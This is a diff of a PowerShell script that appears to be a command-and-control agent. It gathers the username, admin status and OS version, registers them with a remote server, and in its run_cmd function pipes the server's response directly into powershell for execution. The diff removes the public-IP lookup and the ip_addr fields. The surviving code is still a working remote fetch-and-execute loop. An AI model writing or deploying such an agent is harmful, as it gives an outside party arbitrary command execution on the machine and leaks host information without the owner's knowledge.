@@ -16,7 +16,6 @@ $hash_type = 'SHA256'
 #Gather system info
 $is_admin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
 $user = $(whoami)
-$ip_addr = $(Invoke-RestMethod https://now-dns.com/ip)
 $operating_sys = 'Windows ' + [string]$([System.Environment]::OSVersion.Version.Major)
 
 
@@ -36,7 +35,6 @@ function register {
     hash_sum = $hash_sum
     operating_sys = $operating_sys
     user = $user
-    ip_addr = $ip_addr
   }
 
   Invoke-RestMethod -Method Post -Uri $url -Body $body
@@ -65,7 +63,6 @@ function run_cmd {
   $hash_sum = $(Get-FileHash -Algorithm $hash_type $seed).hash
   $body = @{
     hash_sum = $hash_sum
-    ip_addr = $ip_addr
   }
 
   Invoke-RestMethod -Method Post -Uri $url -Body $body | powershell
